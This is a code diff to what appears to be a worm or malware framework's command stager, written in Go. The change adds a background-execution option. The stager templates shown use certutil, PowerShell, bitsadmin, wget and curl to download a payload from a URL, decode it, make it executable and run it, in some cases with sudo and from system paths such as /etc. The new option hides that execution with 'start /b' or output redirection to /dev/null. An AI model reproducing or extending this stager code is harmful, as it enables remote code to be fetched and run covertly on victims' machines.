@@ -94,6 +94,7 @@ var LangExecutors = map[string]string{
 type __N struct {
 	Stager                   string
 	StagerSudo               bool
+	StagerBg				 bool
 	StagerRetry              int
 	Port                     int
 	CommPort                 int
@@ -146,6 +147,7 @@ type __N struct {
 var N = __N{
 	Stager:                   "random",
 	StagerSudo:               false,
+	StagerBg:                 false,
 	StagerRetry:              0,
 	Port:                     6741, //coldfire.RandomInt(2222, 9999),
 	CommPort:                 7777,
@@ -218,13 +220,13 @@ func NeuraxStager() string {
 	sudo := ""
 	stager_retry := strconv.Itoa(N.StagerRetry + 1)
 	windows_stagers := [][]string{
-		{"certutil", `for /l %%N in (1 1 RETRY) do certutil.exe -urlcache -split -f URL && B64 SAVE_PATH\FILENAME`},
-		{"powershell", `for /l %%N in (1 1 RETRY) do Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
-		{"bitsadmin", `for /l %%N in (1 1 RETRY) do bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
+		{"certutil", `for /l %%N in (1 1 RETRY) do certutil.exe -urlcache -split -f URL && B64 BACKGROUND SAVE_PATH\FILENAME`},
+		{"powershell", `for /l %%N in (1 1 RETRY) do Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME`},
+		{"bitsadmin", `for /l %%N in (1 1 RETRY) do bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME`},
 	}
 	linux_stagers := [][]string{
-		{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME; done`},
-		{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME; done`},
+		{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH./FILENAME BACKGROUND; done`},
+		{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH./FILENAME BACKGROUND; done`},
 	}
 	linux_save_paths := []string{"/tmp", "/lib", "~",
 		"/etc", "/usr", "/usr/share"}
@@ -236,11 +238,17 @@ func NeuraxStager() string {
 		if N.Base64 {
 			b64_decoder = "certutil -decode SAVE_PATH/FILENAME SAVE_PATH/FILENAME;"
 		}
+		if N.StagerBg {
+			background = "start /b"
+		}
 	case "linux", "darwin":
 		stagers = linux_stagers
 		paths = linux_save_paths
 		if N.Base64 {
 			b64_decoder = "cat SAVE_PATH/FILENAME|base64 -d > SAVE_PATH/FILENAME;"
+		}
+		if N.StagerBg {
+			background = "> /dev/null 2>&1 &"
 		}
 	}
 	if N.Stager == "random" {
@@ -285,6 +293,7 @@ func NeuraxStager() string {
 	selected_stager_command = strings.Replace(selected_stager_command, "B64", b64_decoder, -1)
 	selected_stager_command = strings.Replace(selected_stager_command, "SUDO", sudo, -1)
 	selected_stager_command = strings.Replace(selected_stager_command, "RETRY", stager_retry, -1)
+	selected_stager_command = strings.Replace(selected_stager_command, "BACKGROUND", background, -1)
 	NeuraxDebug("Created command stager: " + selected_stager_command)
 	return selected_stager_command
 }
